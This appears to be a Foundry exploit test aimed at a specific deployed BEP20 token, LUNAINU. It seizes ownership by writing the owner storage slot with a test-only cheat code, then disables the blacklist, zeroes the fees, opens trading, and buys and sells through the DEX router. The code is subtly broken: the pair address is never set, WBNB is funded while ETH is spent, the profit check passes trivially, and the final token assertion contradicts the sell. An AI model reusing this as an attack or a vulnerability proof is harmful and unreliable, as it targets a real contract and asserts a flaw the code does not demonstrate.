pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IBEP20LUNAINU {
    function WBNB() external view returns (address);
    function getOwner() external view returns (address);
    function router() external view returns (IDEXRouter);
    function manage_blacklist_status(bool _status) external;
    function setMultipliers(uint256 _buy, uint256 _sell, uint256 _trans) external;
    function tradingStatus(bool _status) external;
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IBEP20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xf05A8a840F09aC83B79875B4275CEC1e60C2aBDf;
    address attacker = address(this);
    address public wbnb;
    address public pair;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: get WBNB and prepare router
        wbnb = IBEP20LUNAINU(TARGET).WBNB();
        deal(wbnb, attacker, 100 ether);
        IBEP20(wbnb).approve(address(IBEP20LUNAINU(TARGET).router()), type(uint256).max);

        // Label addresses for clarity
        vm.label(TARGET, "LUNAINU Token");
        vm.label(wbnb, "WBNB");
        vm.label(pair, "LUNAINU-WBNB Pair");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xf05A8a840F09aC83B79875B4275CEC1e60C2aBDf).balanceOf(address(this));
        // Step 1: Become owner by overwriting storage slot 0
        // owner is at slot 0 in Auth contract
        bytes32 ownerSlot = bytes32(uint256(0));
        bytes32 newOwner = bytes32(uint256(uint160(attacker)));
        vm.store(TARGET, ownerSlot, newOwner);

        // Verify we are owner
        assertEq(IBEP20LUNAINU(TARGET).getOwner(), attacker, "Should be owner");

        // Step 2: Disable blacklist mode
        vm.prank(attacker);
        IBEP20LUNAINU(TARGET).manage_blacklist_status(false);

        // Step 3: Set all multipliers to 0 to avoid fees
        vm.prank(attacker);
        IBEP20LUNAINU(TARGET).setMultipliers(0, 0, 0);

        // Step 4: Open trading
        vm.prank(attacker);
        IBEP20LUNAINU(TARGET).tradingStatus(true);

        // Step 5: Buy tokens
        // Get router address from contract
        address routerAddress = address(IBEP20LUNAINU(TARGET).router());
        IDEXRouter router = IDEXRouter(routerAddress);

        // Prepare swap
        address[] memory path = new address[](2);
        path[0] = wbnb;
        path[1] = TARGET;

        // Buy tokens with 10 BNB worth of WBNB
        uint256 amountIn = 10 ether;
        deal(attacker, amountIn); // Ensure attacker has ETH
        vm.prank(attacker);
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amountIn}(
            0,
            path,
            attacker,
            block.timestamp
        );

        // Step 6: Sell tokens back
        // Approve router to spend our tokens
        uint256 tokenBalance = IBEP20(TARGET).balanceOf(attacker);
        vm.prank(attacker);
        IBEP20(TARGET).approve(routerAddress, tokenBalance);

        // Sell path
        address[] memory sellPath = new address[](2);
        sellPath[0] = TARGET;
        sellPath[1] = wbnb;

        uint256 initialBNB = address(attacker).balance;
        vm.prank(attacker);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenBalance,
            0,
            sellPath,
            attacker,
            block.timestamp
        );

        uint256 finalBNB = address(attacker).balance;
        assertGt(finalBNB, initialBNB, "Should have profit");
        uint256 finalBalance = IERC20(0xf05A8a840F09aC83B79875B4275CEC1e60C2aBDf).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

